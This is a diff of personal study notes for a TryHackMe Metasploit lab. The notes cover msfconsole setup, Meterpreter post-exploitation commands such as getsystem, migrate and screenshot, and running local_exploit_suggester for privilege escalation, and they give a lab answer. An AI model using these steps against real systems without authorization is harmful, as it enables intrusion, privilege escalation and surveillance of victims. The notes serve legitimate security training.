@@ -10,6 +10,10 @@ CLI -> sudo msfconsole
 >set LHOST <kali_ip>
 >set RHOSTS <target_ip>
 >exploit  or run 
+meterpreter > getsystem // Privilege Escalation
+ps > list process running on target
+migrate <pid>  //Ex:cmd.exe PID=4564
+screenshot
 
 Meterpreter session: Meterpreter shell is essentially an attack platform that gets injected into memory of running process.Thus it avoids detection by HIDS as well as bypassing the limitations of OS's native command shell.
 The meterpreter can be used to perform different actions on the machine. 
@@ -18,7 +22,15 @@ Eg: Taking SS,get live screen, view webcam and microhone access,record keystroke
 THM Icecast Room:
 getuid  -> Find user running the process
 sysinfo -> Find build,architecture,OS of Windows is the system
-getsystem -> Privilege Escalation
-ps > list process running on target
-migrate <pid>  //Ex:cmd.exe PID=4564
-screenshot
+
+The post/multi/recon/local_exploit_suggester module in Metasploit is used for automatically suggesting potential local privilege escalation exploits on a compromised system. This module works by analyzing the current system's configuration and installed software to identify potential vulnerabilities that can be exploited to escalate privileges.
+Now that we know the architecture of the process, let’s perform some further recon. While this doesn’t work the best on x64 machines, let’s now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
+meterpreter > run post/multi/recon/local_exploit_suggester
+meterpreter > bg
+use exploit suggested by recon
+Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
+...We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
+What permission listed allows us to take ownership of files?    Answer : SeTakeOwnershipPrivilege
+
+
+
